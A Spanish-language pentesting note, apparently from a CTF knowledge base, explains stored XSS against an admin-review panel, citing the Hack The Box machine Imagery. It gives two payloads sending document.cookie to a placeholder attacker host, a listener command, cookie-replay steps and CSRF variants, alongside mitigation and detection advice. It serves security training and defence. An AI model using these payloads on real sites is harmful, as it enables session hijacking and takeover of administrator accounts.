---
topic: XSS almacenado — robo de la cookie de administrador
tags: [web, xss, cookies, admin-bot, imagery]
---

# XSS almacenado — robo de la cookie de administrador

[🌐 English](stored-xss-admin-cookie.en.md) | **Español**

## Concepto

Un XSS almacenado persiste en la base de datos y se ejecuta cuando otra persona visita la página. Si esa persona es un administrador, el script puede leer su cookie de sesión, enviarla al atacante y permitir suplantarlo. Es una cadena clásica cuando hay un panel de administración que revisa reportes, comentarios o tickets.

## Cuándo aplica

- Campo que se guarda y se renderiza sin escapar (HTML, Markdown, atributos).
- Un administrador revisa el contenido desde el mismo origen.
- La cookie de sesión no es `HttpOnly`, o hay acciones sensibles accesibles por CSRF.
- En Imagery, el campo `details` de los reportes de bugs se renderizaba como HTML y el admin lo visitaba.

## Procedimiento

1. Identificar el campo almacenado y comprobar si se escapa.
2. Inyectar un payload que envíe `document.cookie` al atacante.
3. Esperar a que el bot/admin visite la página.
4. Recibir la cookie en el listener.
5. Sustituir la cookie en el navegador y acceder al panel.

## Comandos

```html
<script>new Image().src='http://<ATTACKER>/?c='+encodeURIComponent(document.cookie)</script>
```

```html
<img src=x onerror="fetch('http://<ATTACKER>/',{method:'POST',body:document.cookie})">
```

```bash
python3 -m http.server 80
```

En el navegador: DevTools → Application → Cookies → sustituir el valor y recargar.

## Variantes

- Si `HttpOnly` está activo, usar el XSS para hacer peticiones autenticadas (`fetch('/admin/...')`) y exfiltrar la respuesta.
- Crear un usuario admin o cambiar la contraseña mediante CSRF.
- Usar el XSS para leer tokens CSRF y automatizar acciones.
- Almacenar el payload en un SVG o en un campo que se renderiza en el panel.

## Limitaciones

- `HttpOnly` impide leer la cookie.
- `SameSite=Strict` puede bloquear peticiones cruzadas.
- Un CSP estricto puede impedir scripts inline.
- El admin puede no visitar el contenido o hacerlo en un entorno aislado.

## Mitigación

- Escapar la salida según el contexto (HTML, atributo, JS, URL).
- Usar `HttpOnly`, `Secure` y `SameSite` en cookies de sesión.
- Implementar CSP con nonces y sin `unsafe-inline`.
- Sanitizar HTML con una allowlist (DOMPurify) si se permite formato.
- Revisar el contenido en un dominio aislado.

## Detección

- Etiquetas `<script>`, `onerror`, `onload` o `javascript:` en campos de usuario.
- Peticiones salientes desde el navegador del admin a dominios no esperados.
- Cookies usadas desde IPs o user-agents distintos.
- Cambios de sesión justo después de visitar contenido reportado.

## Referencias

- [OWASP — Cross Site Scripting](https://owasp.org/www-community/attacks/xss/)
- [OWASP — XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [0xdf — Imagery](https://0xdf.gitlab.io/2025/02/08/htb-imagery.html)
- [Ficha Imagery](../../machines/linux/imagery/README.md)
